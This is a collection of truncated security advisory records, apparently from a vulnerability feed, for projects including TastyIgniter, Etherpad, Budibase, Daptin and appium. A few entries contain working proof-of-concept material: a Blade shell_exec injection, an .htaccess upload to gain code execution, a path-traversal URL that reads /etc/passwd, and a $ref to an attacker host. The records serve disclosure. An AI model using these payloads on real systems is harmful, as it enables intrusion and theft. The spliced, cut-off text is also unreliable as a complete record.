items.title: TastyIgniter mail template editor allows remote code execution via server-side template injection
items.description:
Summary
Where: POST /admin/mail_templates/edit/{id} → body field
Who can trigger: Any admin user with Admin.MailTemplates permission
Impact: Arbitrary PHP execution on the server — full RCE

Details
The Mail templates is vulnerable to SSTI and did not perform an validation and sanitization.

PoC

- login as admin
- create new mail template with following command

@php echo shell_exec('echo "RCE Executed";id'); @endphp

- save the request
- execute the request using X-IGNITER-REQUEST-HANDLER: onTestTemplate

POST /admin/mail_templates/edit/20 HTTP/1.1
Host: localhost:8888
Content-Length: 47
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
sec-ch-ua-platform: "Linux"
X

items.title: TastyIgniter allows Remote Code Execution (RCE) via Unrestricted file upload in Media Manager
items.description:
Summary
Media manager accepts .htaccess file which can be used to perform RCE.

Details
The file upload functionality from media manager somehow accepts .htaccess file. This file could be used to allow any extension to run PHP command. By doing so, it is possible to perform RCE.

PoC
- Login as Admin
- Create a .htaccess file with the following code.


 SetHandler application/x-httpd-php

- Upload the .htaccess file via the Media Manager.

```
POST /admin/media_manager HTTP/1.1
Host: localhost:8888
Content-Length: 357
sec-ch-ua-platform: "Linux"
X-CSRF-TOKEN: 2vv3ZKpvfj2SkbbJzqmf8G053mNXqPLktxqd5eMx
Cache-Control: no-cache
Accept-Language: en-US,en;q=0.9
sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"
sec-ch-ua-mo

items.title: GitHub CLI gh codespace jupyter may allow code execution via unvalidated URLs from malicious Codespaces
items.description:
Summary

A security vulnerability has been identified in GitHub CLI that could allow remote code execution when users connect to a malicious Codespace using the gh codespace jupyter command. The command opens JupyterLab by launching a URL in the user's browser, but that URL is supplied by a process running inside the Codespace and the CLI opens it without validating it.

The browser launcher accepts vscode:// and vscode-insiders:// links, so a malicious Codespace can return a crafted vscode:// URL. The CLI opens the link, the operating system hands it to VS Code, and VS Code acts on it, which can lead to code execution on the user's workstation.

items.title: Daptin: Unauthenticated SQL Injection via the sort query parameter on every entity list endpoint
items.description:
Summary

An unauthenticated attacker can inject arbitrary SQL through the sort query parameter accepted by
Daptin's generic entity list endpoint (GET /api/<entity>), which every table in a Daptin instance
exposes. The parameter is concatenated into raw SQL identifiers with no validation that the
referenced column exists, unlike a sibling code path in the same file that received exactly this
validation as the fix for a previously published advisory
(GHSA-rw2c-8rfq-gwfv (https://github.com/daptin/daptin/security/advisories/GHSA-rw2c-8rfq-gwfv)).
Impact ranges from unauthenticated denial of service (a single crafted request 500s the query) to
blind/error-based extraction of data from tables the requester has no permission to read.

items.title: Etherpad: Pre-auth arbitrary file read
items.description:
Summary

An unauthenticated path‑traversal / arbitrary file read vulnerability in Etherpad's /static/* handler allows any remote, unauthenticated user to read any file on the server's filesystem (e.g. GET /static/plugins/ep_etherpad-lite/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc/passwd returns /etc/passwd) available to the user running the etherpad software. Because the endpoint is mounted before the authentication middleware, no credentials, session, or configuration change are required. The read primitive could escalate to a full server compromise: on a typical deployment by disclosing settings.json / credentials.json / /proc/self/environ, which contain the admin password, giving an attacker an admin session and, through the admin plugin installer, remote code execution.

items.title: CKAN: Session Fixation in Registration View
items.description:
Description

Web user registration form is vulnerable to session fixation if the site is configured with server-side session storage (CKAN uses cookie-based session storage by default). The attacker would need to either set a cookie on the victim's browser or steal the victim's currently valid session. Session identifiers are now regenerated after registration.

Patches

This vulnerability has been fixed in CKAN 2.10.11, 2.11.6 and 2.12.0

Workarounds

switch to cookie-based session storage (the default) or disable web user registration by setting ckan.auth.create_user_via_web to false (the default)

items.title: Budibase: Unauthenticated global-admin & database creation via tenant-confusion bypass of the one-time init guard (POST /api/global/users/init)
items.description:
Description

Summary

On a self-hosted, single-tenant Budibase instance (multiTenancy:false), the public bootstrap endpoint POST /api/global/users/init remains fully exploitable after the instance has been provisioned. Its "already initialised" guard (checkAnyUserExists()) is evaluated inside a tenant-scoped database context derived from an attacker-controlled tenantId in the request body. Because the tenancy layer never constrains that tenantId to the only legitimate tenant (default) on a single-tenant deployment, an unauthenticated attacker simply supplies any unused tenant name to make the guard see an empty user list, and the endpoint then creates a brand-new CouchDB database (_global-db) and a global-admin user document (`admin.global = t

items.title: AIT-GUI route chain allows unauthenticated Python execution in server process
items.description:
Summary
A security issue exists where unauthenticated callers can instruct the AIT-GUI server to execute arbitrary Python scripts. The attack vector involves obtaining a session cookie through GET /, followed by a malicious POST /script/run request containing an absolute file path that bypasses the configured script directory restrictions.

Patches
* 2.5.1

Impact
This vulnerability allows unauthenticated remote code execution on the AIT-GUI server. Any attacker with network access can execute arbitrary Python code with daemon privileges.

Details
_Chain:_
1. POST /tlm/query writes the user-controlled fields value into fields_in.txt under the AIT-GUI static directory.
 * If the supplied dataDir has no .pcap files, the route returns the expected 400 Bad Request

items.title: nats-server Leaf node connections bypass Nats-Trace-Dest permission check
items.description:
Background

NATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT and edge computing.

The NATS Server supports leafnode connections between servers and message tracing through NATS headers.

Problem Description

Message trace destination checks were applied to ordinary client connections but not consistently to messages arriving through leafnode connections.

A leafnode operator could cause trace events to be sent to subjects that would not otherwise be permitted and could use trace-only behavior to prevent normal delivery or storage of affected messages.

Trace events can include routing, subscription, account, service import and JetStream metadata. The payload of the original application message is not chosen

items.description:
Description

Summary

A low-privileged application end-user (role BASIC - not a builder or admin, and on a public data-collection form, an unauthenticated visitor) can store an HTML/JavaScript payload in ordinary row data. When a builder or admin later opens that table in the Budibase Builder and evaluates any Handlebars binding whose Preview surfaces the value (the Data-section Formula column editor, or any binding drawer), the stored value is rendered as raw HTML and the attacker's JavaScript executes in the Builder's origin.

items.description:
Summary

svg2rlg() expands references without any limit on the total number of expansions. Only direct cycles are rejected (CircularRefError). items.description:
What the fix did and the gap

The v2.3.0 fix (commit e88dabb) routed the _select field through a strict new gate, sanitizeSelectField (postgres.go:947/1003/2097). The sibling _groupby path was left on the far weaker isSafeSQLExpression. adapters/postgres/postgres.go, GroupByClause (line 1946): a _groupby field that contains balanced parens takes the raw-SQL-expression branch (around lines 1999-2006), gated only by isSafeSQLExpression (line 2001, defined at 2043). That gate validates only the OUTERMOST function name against a 13-entry allowlist and uses a character allowlist that permits spaces, single quotes and parens. It blocks ;, --, /* , unbalanced parens and an outer pg_ prefix, but NOT a trailing UNION SELECT ..., a nested (SELECT ...) subquery, or an inne

items.title: js-toml allows uncontrolled recursion in load() leading RangeError (stack exhaustion) on deeply nested input
items.description:
Summary

load() parses untrusted TOML using a recursive-descent parser (Chevrotain) and a
recursive tree-walking interpreter. Neither the parser nor the interpreter enforces a
maximum nesting / key depth. A small, attacker-controlled document with deep nesting
(arrays, inline tables) or a long dotted key drives recursion past the V8 call-stack

Impact

amqtt is vulnerable to a remote denial of service caused by improper MQTT topic-filter validation combined with catastrophic regular-expression backtracking.

items.title: appium allows unauthenticated arbitrary file/directory deletion in @appium/storage-plugin
items.description:
Summary

The Appium storage plugin exposes an HTTP endpoint POST /storage/delete that takes a user-supplied name and deletes it from the server storage folder. The handler passes name straight into path.join(storageRoot, name) and then fs.rimraf() without any path sanitization. By sending a name containing ../ sequences, an unauthenticated remote client can escape the storage root and recursively delete arbitrary files and directories that the Appium process user can write, anywhere on the host filesystem.

The same plugin's *upload* path validates the name via fs.sanitizeName (requireValidItemOptions), but the *delete* path does not an asymmetry that makes the missing validation unambiguous.

items.title: Refitter: Unrestricted OpenAPI references permit build-host SSRF and file inclusion
items.description:
Summary

Refitter (the refitter dotnet tool, built on NJsonSchema for $ref resolution) fetches remote
http(s) URLs and reads local files (including absolute paths and ../ traversal outside the input
directory), inlining the referenced schema into the generated Refit interface/contracts. Running
refitter --output Out.cs on a spec whose $ref points at an attacker/internal URL or an
arbitrary local file yields SSRF, remote file inclusion, and local file inclusion. Verified on
Refitter 2.0.0.

Details

- $ref: http://attacker-or-internal/evil.json#/... -> build host fetches (SSRF) and inlines the
 remote schema (RFI); confirmed property REMOTE_REFIT_PROP.
- $ref: /abs/path.json#/... or ../../secret.json#/... -> out-of-tree local file read + inlined
 (LFI);

iocs.detection_guidance: Monitor proxy/web filter logs, browser history, and HTTP inspection rules.
